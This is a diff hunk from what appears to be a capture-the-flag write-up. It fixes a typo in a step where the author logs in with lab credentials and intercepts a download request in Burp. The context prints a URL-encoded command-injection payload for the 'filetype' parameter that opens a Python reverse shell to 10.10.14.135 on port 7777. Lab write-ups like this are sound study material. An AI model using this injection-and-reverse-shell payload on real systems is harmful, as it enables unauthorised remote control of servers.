@@ -27,7 +27,7 @@ function init() {
 window.onload = init;
 ```
 
--> Its a login pH0t0:b0Mb!, so I try to login, and got access, but there is nothing to see, so I try and intercept the dowload button with burp, and modify the filetype parameter to get a reverse shell
+-> Its a login pH0t0:b0Mb!, so I try to login, and got access, but there is nothing to see, so I try and intercept the download button with burp, and modify the filetype parameter to get a reverse shell
 
 %3bexport+RHOST%3d"10.10.14.135"%3bexport+RPORT%3d7777%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
 ![reverseshellburp](https://user-images.githubusercontent.com/47869173/220764975-826b4903-daaf-426c-89a6-d05c93f28c5e.png)
